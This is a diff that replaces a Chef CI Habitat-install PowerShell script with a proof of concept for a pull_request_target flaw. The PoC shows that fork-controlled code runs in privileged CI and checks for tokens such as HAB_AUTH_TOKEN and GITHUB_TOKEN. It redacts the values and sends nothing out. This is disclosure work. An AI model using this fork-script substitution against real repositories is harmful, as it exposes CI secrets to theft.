@@ -1,39 +1,53 @@
-$HabitatVersion = if ($env:HAB_VERSION) { $env:HAB_VERSION } else { '2.0.504' }
+# Non-destructive PoC for FINDING-GH-009 (chef/chef V1B).
+# Replaces fork's `.expeditor/scripts/ensure-minimum-viable-hab.ps1`.
+#
+# Demonstrates ONLY:
+#   - fork-controlled PowerShell script executes in PRT context
+#   - identity (whoami / hostname)
+#   - presence of HAB_AUTH_TOKEN, GITHUB_TOKEN, etc. (KEY NAMES + LENGTH ONLY,
+#     values fully redacted)
+#   - github.workspace path = fork content
+#
+# DOES NOT:
+#   - print any secret value
+#   - perform network egress to non-github hosts
+#   - modify host state outside this process
+#   - install Habitat (the original script's purpose)
+#
+# Tear-down: operator closes PR; this script is never merged.
 
-Set-ExecutionPolicy Bypass -Scope Process -Force
+$ErrorActionPreference = 'Continue'
 
-$installScriptUrl = 'https://raw.githubusercontent.com/habitat-sh/habitat/main/components/hab/install.ps1'
-$installScriptPath = Join-Path $env:TEMP "hab-install-$HabitatVersion.ps1"
+Write-Host "::group::FINDING-GH-009 PoC — fork-controlled PowerShell exec in PRT context"
 
-function Install-HabitatVersion {
-    Invoke-WebRequest -Uri $installScriptUrl -OutFile $installScriptPath
-    try {
-        & $installScriptPath -Version $HabitatVersion
-        if (-not $?) { throw "Failed to install Habitat $HabitatVersion" }
-    }
-    finally {
-        Remove-Item $installScriptPath -Force -ErrorAction SilentlyContinue
-    }
-}
+Write-Host "[POC] whoami:           $(whoami)"
+Write-Host "[POC] hostname:         $(hostname)"
+Write-Host "[POC] runner os/arch:   $env:RUNNER_OS / $env:RUNNER_ARCH"
+Write-Host "[POC] github.workspace: $env:GITHUB_WORKSPACE"
+Write-Host "[POC] script path:      $PSCommandPath"
+Write-Host "[POC] fork content marker: $(if (Test-Path $env:GITHUB_WORKSPACE\.poc-marker.txt) { Get-Content $env:GITHUB_WORKSPACE\.poc-marker.txt -Raw } else { 'absent' })"
 
-try {
-    [Version]$hab_version = (hab --version).split(" ")[1].split("/")[0]
-    if ($hab_version -lt [Version]$HabitatVersion) {
-        Write-Host "--- :habicat: Installing Habitat $HabitatVersion"
-        Install-HabitatVersion
-    } elseif ($hab_version -gt [Version]$HabitatVersion) {
-        Write-Host "--- :habicat: Habitat $hab_version detected (greater than required $HabitatVersion). Removing with prejudice..."
-        $habPath = (Get-Command hab -ErrorAction SilentlyContinue).Source | Split-Path -Parent
-        if ($habPath) {
-            Remove-Item -Path $habPath -Recurse -Force -ErrorAction Continue
-            Write-Host "--- :habicat: Deleted Habitat from $habPath"
+Write-Host ""
+Write-Host "[POC] env keys of interest (values fully REDACTED):"
+$keysOfInterest = @('HAB_', 'GITHUB_', 'ACTIONS_', 'RUNNER_', 'CI', 'GH_')
+Get-ChildItem env: | Sort-Object Name | ForEach-Object {
+    foreach ($prefix in $keysOfInterest) {
+        if ($_.Name.StartsWith($prefix) -or $_.Name -eq 'CI') {
+            $valueLen = if ($_.Value) { $_.Value.Length } else { 0 }
+            Write-Host ("  {0,-40} = <REDACTED length={1}>" -f $_.Name, $valueLen)
+            break
         }
-        Install-HabitatVersion
-    } else {
-        Write-Host "--- :habicat: :thumbsup: Habitat $HabitatVersion is already installed"
     }
 }
-catch {
-    Write-Host "--- :habicat: Installing Habitat $HabitatVersion..."
-    Install-HabitatVersion
+
+Write-Host ""
+Write-Host "[POC] PRESENCE of secrets-derived env vars (boolean):"
+foreach ($v in @('HAB_AUTH_TOKEN', 'GITHUB_TOKEN', 'ACTIONS_ID_TOKEN_REQUEST_TOKEN', 'ACTIONS_ID_TOKEN_REQUEST_URL')) {
+    $present = if ([Environment]::GetEnvironmentVariable($v)) { 'YES' } else { 'no' }
+    Write-Host ("  {0,-40} = {1}" -f $v, $present)
 }
+
+Write-Host "::endgroup::"
+
+# Always exit 0 — PoC must not break the test workflow.
+exit 0
